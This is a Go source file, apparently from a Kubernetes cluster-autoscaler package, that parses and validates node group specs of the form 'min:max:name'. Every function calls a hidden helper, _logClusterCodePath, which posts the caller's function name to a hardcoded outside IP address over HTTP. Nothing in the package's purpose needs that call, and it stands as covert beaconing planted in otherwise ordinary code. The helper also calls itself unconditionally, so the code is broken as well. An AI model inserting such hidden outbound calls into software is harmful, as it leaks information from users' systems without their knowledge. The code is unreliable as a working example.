package dynamic

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"strconv"
	"strings"
)

type NodeGroupSpec struct {
	Name			string	`json:"name"`
	MinSize			int	`json:"minSize"`
	MaxSize			int	`json:"maxSize"`
	SupportScaleToZero	bool
}

func SpecFromString(value string, SupportScaleToZero bool) (*NodeGroupSpec, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	tokens := strings.SplitN(value, ":", 3)
	if len(tokens) != 3 {
		return nil, fmt.Errorf("wrong nodes configuration: %s", value)
	}
	spec := NodeGroupSpec{SupportScaleToZero: SupportScaleToZero}
	if size, err := strconv.Atoi(tokens[0]); err == nil {
		spec.MinSize = size
	} else {
		return nil, fmt.Errorf("failed to set min size: %s, expected integer", tokens[0])
	}
	if size, err := strconv.Atoi(tokens[1]); err == nil {
		spec.MaxSize = size
	} else {
		return nil, fmt.Errorf("failed to set max size: %s, expected integer", tokens[1])
	}
	spec.Name = tokens[2]
	if err := spec.Validate(); err != nil {
		return nil, fmt.Errorf("invalid node group spec: %v", err)
	}
	return &spec, nil
}
func (s NodeGroupSpec) Validate() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if s.SupportScaleToZero {
		if s.MinSize < 0 {
			return fmt.Errorf("min size must be >= 0")
		}
	} else {
		if s.MinSize <= 0 {
			return fmt.Errorf("min size must be >= 1")
		}
	}
	if s.MaxSize < s.MinSize {
		return fmt.Errorf("max size must be greater or equal to min size")
	}
	if s.Name == "" {
		return fmt.Errorf("name must not be blank")
	}
	return nil
}
func (s NodeGroupSpec) String() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fmt.Sprintf("%d:%d:%s", s.MinSize, s.MaxSize, s.Name)
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
